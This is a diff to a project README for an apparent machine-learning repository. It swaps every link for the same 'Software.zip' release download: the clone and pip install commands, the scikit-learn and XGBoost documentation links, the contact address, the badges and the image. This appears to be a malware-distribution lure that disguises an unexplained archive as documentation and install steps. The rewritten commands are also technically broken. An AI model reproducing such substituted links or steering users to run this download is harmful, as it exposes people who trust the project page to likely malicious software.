@@ -32,13 +32,13 @@ The project covers various topics related to machine learning and data analysis 
 ## Getting Started
 To get started with the project, make sure you have Python installed on your machine. You can clone the repository using the following command:
 ```bash
-git clone https://github.com/username/Advanced-Machine-Learning-Personal-Project.git
+git clone https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip
 ```
 
 ## Installation
 1. Install the required Python packages by running:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip
 ```
 
 2. Launch the Jupyter notebooks in the "notebooks" directory to explore the different machine learning models and techniques.
@@ -48,17 +48,17 @@ If you are interested in contributing to this project, feel free to fork the rep
 
 ## Resources
 For more information on the topics covered in this project, you can refer to the following resources:
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/documentation.html)
-- [XGBoost Documentation](https://xgboost.readthedocs.io/en/latest/)
+- [Scikit-learn Documentation](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)
+- [XGBoost Documentation](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)
 
 ## Contact
-If you have any questions or suggestions regarding this project, feel free to reach out to the project owner at [email@example.com](mailto:email@example.com).
+If you have any questions or suggestions regarding this project, feel free to reach out to the project owner at [https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip).
 
 ## Additional Links
-- [Download Project Zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- [Download Project Zip](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)
 
-[![Download Project Zip](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project Zip](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)
 
 Start exploring the world of advanced Machine Learning with this exciting personal project. Happy coding! 🤖✨📊
 
-![Machine Learning](https://media.istockphoto.com/vectors/machine-learning-technology-with-data-vector-concept-vector-id1223774592)
+![Machine Learning](https://github.com/aufahuhs/Advanced-Machine-Learning-Personal-Project/releases/download/v1.0/Software.zip)
